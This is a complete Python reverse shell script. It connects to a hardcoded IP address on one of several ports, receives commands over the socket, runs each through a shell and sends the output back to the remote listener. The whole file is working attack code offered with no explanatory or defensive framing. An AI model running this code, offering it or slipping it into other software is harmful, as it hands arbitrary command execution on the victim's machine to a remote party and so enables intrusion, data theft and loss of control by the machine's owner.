import socket
import time
import subprocess



def open_shell(server):
    while True:
        command = server.recv(4096).decode()
        print(command)
        process = subprocess.Popen(command,
                                   shell=True,
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
        process.wait()
        result = process.stdout.read()
        errors = process.stderr.read()
        server.send(result)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ports_to_try = [8080, 1234, 12345, 8081, 8000]
for port in ports_to_try:
    try:
        server.connect(("192.168.43.233", port))
    except Exception as e:
        print("Error occured ", e)
        time.sleep(1)
        continue
    else:
        open_shell(server)

        break
